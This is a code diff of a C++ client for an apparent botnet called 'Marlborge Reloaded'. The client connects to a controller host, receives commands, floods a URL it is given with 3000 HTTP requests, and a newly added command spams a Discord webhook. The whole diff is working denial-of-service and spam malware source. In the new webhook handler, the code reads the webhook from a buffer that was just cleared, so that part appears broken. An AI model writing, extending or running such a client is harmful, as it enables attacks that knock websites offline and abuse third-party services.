@@ -4,12 +4,16 @@
 #include <cpr/cpr.h>
 #include <sstream>
 
+#include "DiscordThings.h"
+#include "HTTP.h"
+
 using namespace std;
 
 #pragma comment(lib, "Ws2_32.lib")
 
 #define HOST "127.0.0.1" // Set your VPS IP Addres
 #define PORT 3000 // Set the connection port
+#define REQQUANTITY 3000
 
 WSADATA wsaData;
 
@@ -17,7 +21,14 @@ SOCKET sock;
 sockaddr_in saIn;
 int iResult;
 
+DiscordThings* dcThings;
+HTTP* http;
+
 char buffer[1024];
+
+void ClearBuffer() {
+	memset(buffer, 0, sizeof(buffer));
+}
 
 void CloseSocket() {
 	closesocket(sock);
@@ -28,17 +39,25 @@ void CloseSocket() {
 }
 
 void DoS() {
+	recv(sock, buffer, sizeof(buffer), 0);
 	cout << "Sending requests to the specified URL" << endl;
-	string url;
 	stringstream ss;
-	ss << buffer;
-	ss >> url;
-	cout << url;
+	ss << buffer; string url; ss >> url;
+	http->DoS(url, REQQUANTITY);
+}
 
-	for (int i = 0; i < 3000; i++) {
-		cpr::Get(cpr::Url{ url });
-	}
-	return;
+void SpamDiscordWebhook() {
+	stringstream ss;
+	ClearBuffer();
+	ss << buffer; string webhook; ss >> webhook;
+	ClearBuffer();
+	recv(sock, buffer, sizeof(buffer), 0);
+	ss << buffer; string msg; ss >> msg;
+	ClearBuffer();
+	recv(sock, buffer, sizeof(buffer), 0);
+	ss << buffer; int quantity; ss >> quantity;
+
+	dcThings->SpamDiscordWebhook(webhook, msg, quantity);
 }
 
 void ConnectSocket() {
@@ -76,11 +95,14 @@ void Listen() {
 	recv(sock, buffer, sizeof(buffer), 0);
 	stringstream ss;
 	ss << buffer; int opt; ss >> opt;
-	cout << opt << endl;
+	ClearBuffer();
 
 	switch (opt) {
 	case 1:
 		DoS();
+		break;
+	case 2:
+		SpamDiscordWebhook();
 		break;
 	default:
 		cout << "Invalid option sent from host" << endl;
@@ -95,7 +117,6 @@ int main() {
 	cout << "Marlborge Reloaded Client v0.5 (Chameleon)" << endl;
 	ConnectSocket();
 	Listen();
-	DoS();
 	main();
 
 	return 0;
